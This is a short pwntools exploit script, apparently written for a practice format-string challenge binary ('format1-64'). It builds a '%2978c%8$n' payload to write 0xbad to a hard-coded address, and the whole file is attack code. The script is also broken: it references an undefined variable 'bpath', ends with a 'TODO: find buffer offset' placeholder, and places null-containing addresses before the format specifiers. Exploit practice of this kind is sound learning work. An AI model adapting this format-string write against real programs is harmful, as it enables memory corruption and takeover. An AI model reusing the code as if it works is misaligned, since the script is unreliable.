from pwn import *

binary = './format1-64'
context.binary = bpath 
context.log_level = 'debug'

p = process(binary)
target_addr = p64(0x55555560104c)
win_addr = p64(0x5555554008fa)

#AAA (3 bytes) + target (8 bytes) + 2978 = 2989 (0xbad in decimal format)
exploit_str = b'AAA' + target_addr +b'%2978c' + b"%8$n"

p.recvline()
p.recvline()

p.sendline(exploit_str)
p.recvline()

p.sendline(b'TODO: find buffer offset')

p.recvall()
p.wait()


 

